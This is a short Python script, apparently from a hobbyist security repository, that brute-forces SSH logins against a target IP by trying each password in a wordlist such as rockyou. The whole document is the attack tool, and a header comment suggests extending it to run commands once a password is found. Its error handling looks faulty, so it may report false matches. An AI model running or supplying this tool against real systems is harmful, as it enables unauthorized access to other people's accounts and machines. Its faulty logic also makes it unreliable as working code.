# Simple ssh password bruteforcer
# need a password file 
# User name should be known
# can be modified to someother such as after password finding execute some command as "sshlogin.py"


#!/usr/bin/python3

import pexpect
import argparse

PROMPT = ['# ','>>> ','> ','\$ ']

def ssh_connect_direct(user,pswd,ip):
	connStr = 'ssh '+'-oHostkeyAlgorithms=+ssh-rsa '+user+'@'+ip 
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT,"password:"])
	if ret == 0:
		print("[-] Connction failed!")
		return
	child.sendline(pswd)
	child.expect(PROMPT,timeout=0.1)
	return child


def main():
	parser = argparse.ArgumentParser(description="This is simple ssh login code")
	parser.add_argument('-i','--IP-ADDR',dest='tgtIP',metavar="<ip address>",help='target IP address')
	parser.add_argument('-u','--USER',dest='tgtUser',metavar="<user>",help='user to access')
	parser.add_argument('-pl','--PASSWORD-LIST',dest='tgtPassList',metavar="<password list>",help='password list text file Example:Rockyou!')

	args = parser.parse_args()

	if args.tgtUser == None or args.tgtIP == None or args.tgtPassList == None:
		print(parser.print_help())
		exit(0)
	passwordList = open(args.tgtPassList,'r')
	for passwd in passwordList.readlines():
		passwd = passwd.strip('\n')
		try:
			child = ssh_connect_direct(args.tgtUser,passwd,args.tgtIP)
			print(f'[+] Password found:{passwd}')
			break
		except:
			print(f"[-] {passwd} Not match")


if __name__ == '__main__':
	main()